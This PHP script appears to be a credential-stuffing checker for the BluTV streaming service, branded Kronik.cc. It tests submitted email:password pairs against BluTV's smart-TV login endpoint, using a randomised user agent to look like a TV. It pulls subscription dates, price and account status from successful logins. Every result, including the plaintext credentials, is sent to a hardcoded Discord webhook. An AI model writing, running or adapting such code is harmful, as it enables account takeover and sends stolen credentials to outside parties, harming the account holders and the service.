<?php

include_once "../../server/authcontrol.php";

ini_set("display_errors", 0);
error_reporting(0);

@session_start();

$lista = htmlspecialchars($_POST['lista']);

if (!empty($lista)) {
    $array = explode(":", $lista);

    $mail = trim($array[0]);
    $pass = trim($array[1]);

    $min = 100;
    $max = 999;

    $random1 = rand($min, $max);
    $random2 = rand($min, $max);
    $url = 'https://smarttv.blutv.com.tr/actions/account/login';
    $agent = 'Mozilla/5.0 (Linux; Tizen 2.3) AppleWebKit/' . $random1 . '.1 (KHTML, like Gecko)Version/2.3 TV Safari/' . $random2 . '.1';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt(
        $ch,
        CURLOPT_POSTFIELDS,
        "username=$mail&password=$pass&platform=com.blu.smarttv"
    );
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    $curl_scraped_page = curl_exec($ch);
    function Capture($str, $starting_word, $ending_word)
    {
        $subtring_start  = strpos($str, $starting_word);
        $subtring_start += strlen($starting_word);
        $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
        return substr($str, $subtring_start, $size);
    };
    $fim = json_decode($curl_scraped_page, true);
    if ($fim['status'] == 'ok') {
        $startdate = Capture($curl_scraped_page, 'StartDate":"', '",');
        $enddate = Capture($curl_scraped_page, 'EndDate":"', '",');
        $price = Capture($curl_scraped_page, 'Price":"', '",');
        $accountstate = Capture($curl_scraped_page, 'AccountState":"', '",');
        switch ($accountstate) {
            case 'Active':
                $accountstate = "AKTİF";
                echo "<p style='margin-bottom: 5px; margin-top: 5px;'>BLUTV | ✅ #Aktif - $mail:$pass Başlangıç Tarihi: $startdate - Bitiş Tarihi: $enddate - Ücret: $price - Hesap Durum: $accountstate | <b>Kronik.cc</b></p>";
                
                $tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/937794238790381609/xSRNGj_imD5hJvGdhhgGvCOUfc-G7s2ygQS8-rkjpPwZ1gs0Pqzoc3G4OJdDF_O_ZzK8";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
					
					"content" => "@everyone",
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.cc",

                            
                            "type" => "rich",

                           
                            "description" => "BLUTV | ✅ #Aktif - $mail:$pass Başlangıç Tarihi: $startdate - Bitiş Tarihi: $enddate - Ücret: $price - Hesap Durum: $accountstate",

                            
                            "url" => "https://Kronik.cc",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
                break;
            case 'Suspend':
                $accountstate = "DURDURULMUŞ";
                echo "<p style='margin-bottom: 5px; margin-top: 5px;'>BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc</b></p>";
                $tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/937794238790381609/xSRNGj_imD5hJvGdhhgGvCOUfc-G7s2ygQS8-rkjpPwZ1gs0Pqzoc3G4OJdDF_O_ZzK8";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.cc",

                            
                            "type" => "rich",

                           
                            "description" => "BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc",

                            
                            "url" => "https://Kronik.cc",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
                break;
            case 'Canceled':
                $accountstate = "KAPANMIŞ";
                echo "<p style='margin-bottom: 5px; margin-top: 5px;'>BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc</b></p>";
                $tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/937794238790381609/xSRNGj_imD5hJvGdhhgGvCOUfc-G7s2ygQS8-rkjpPwZ1gs0Pqzoc3G4OJdDF_O_ZzK8";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.cc",

                            
                            "type" => "rich",

                           
                            "description" => "BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc",

                            
                            "url" => "https://Kronik.cc",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
                break;
            case 'None';
                $accountstate = "CUSTOM";
                echo "<p style='margin-bottom: 5px; margin-top: 5px;'>BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc</b></p>";
                $tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/937794238790381609/xSRNGj_imD5hJvGdhhgGvCOUfc-G7s2ygQS8-rkjpPwZ1gs0Pqzoc3G4OJdDF_O_ZzK8";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.cc",

                            
                            "type" => "rich",

                           
                            "description" => "BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc",

                            
                            "url" => "https://Kronik.cc",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
                return $accountstate;
        }
    } else {
        echo "<p style='margin-bottom: 5px; margin-top: 5px;'>BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc</b></p>";
        $tarih = date('Y-m-d H:i:s');
                
                
                $url = "https://discord.com/api/webhooks/937794238790381609/xSRNGj_imD5hJvGdhhgGvCOUfc-G7s2ygQS8-rkjpPwZ1gs0Pqzoc3G4OJdDF_O_ZzK8";

                $hookObject = json_encode([
                   
                    
                   
                    "username" => "",
                   
                    "avatar_url" => "",
                   
                    "tts" => false,
                   
                    "embeds" => [
                        
                        [
                            "title" => "Kronik.cc",

                            
                            "type" => "rich",

                           
                            "description" => "BLUTV | ❌ #Kapalı - $mail:$pass | <b>Kronik.cc",

                            
                            "url" => "https://Kronik.cc",

                            
                            "timestamp" => "$tarih",

                         
                            "color" => hexdec( "FFFFFF" ),

                            
                            "footer" => [
                                "text" => "Tarih: $tarih de CHECKLENDI",
                                "icon_url" => ""
                            ],

                            
                            "image" => [
                                "url" => ""
                            ],

                            
                            "thumbnail" => [
                                "url" => ""
                            ],

                            
                            "author" => [
                                "name" => "Vallens",

                            ],

                            
                        ]
                    ]

                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                $ch = curl_init();

                curl_setopt_array( $ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $hookObject,
                    CURLOPT_HTTPHEADER => [
                        "Content-Type: application/json"
                    ]
                ]);

                $response = curl_exec( $ch );
                curl_close( $ch );
    }
    curl_close($ch);
}

session_write_close();